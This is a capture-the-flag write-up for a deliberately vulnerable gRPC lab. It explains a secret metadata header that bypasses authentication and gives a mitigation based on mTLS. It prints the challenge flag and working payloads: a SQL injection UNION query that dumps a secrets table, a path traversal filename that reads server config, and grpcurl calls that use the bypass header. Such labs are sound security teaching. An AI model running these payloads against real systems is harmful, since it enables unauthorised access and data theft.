# Challenge 09 — Metadata Header Bypass

**Category:** Broken Authentication
**Difficulty:** 🟡 Medium
**Service:** All services
**Flag:** `FLAG{m3t4d4t4_byp4ss_l1k3_4_pr0}`

---

## Background

gRPC metadata is analogous to HTTP headers. Developers sometimes implement "internal service" bypasses using secret metadata headers — essentially security through obscurity. Once an attacker discovers the header value (via source review, path traversal, or SQLi), they can completely bypass authentication on every protected RPC.

The bypass header value is stored in the `secrets` database table and in `server/config.py`.

---

## Discovery

```bash
# Via SQL injection (Challenge 03) — dump secrets table
grpcurl -plaintext localhost:50051 dvgrpc.ProductService/SearchProducts \
  -d '{"query":"'"'"' UNION SELECT id,key,value,1.0,'"''"' FROM secrets--"}'

# Via path traversal (Challenge 06) — read config.py
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.FileService/ReadFile \
  -d '{"filename":"../../server/config.py"}'
```

---

## Exploitation

```bash
# Bypass auth on ANY protected endpoint — no token required
grpcurl -plaintext \
  -H "x-internal-service: dvgrpc-internal-v1" \
  localhost:50051 dvgrpc.UserService/GetProfile \
  -d '{"user_id":1}'

grpcurl -plaintext \
  -H "x-internal-service: dvgrpc-internal-v1" \
  localhost:50051 dvgrpc.UserService/ListUsers \
  -d '{}'
```

---

## Fix

Remove the bypass entirely. Use mTLS for service-to-service authentication:

```yaml
# Istio/service mesh: require mTLS for all inter-service calls
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: STRICT
```
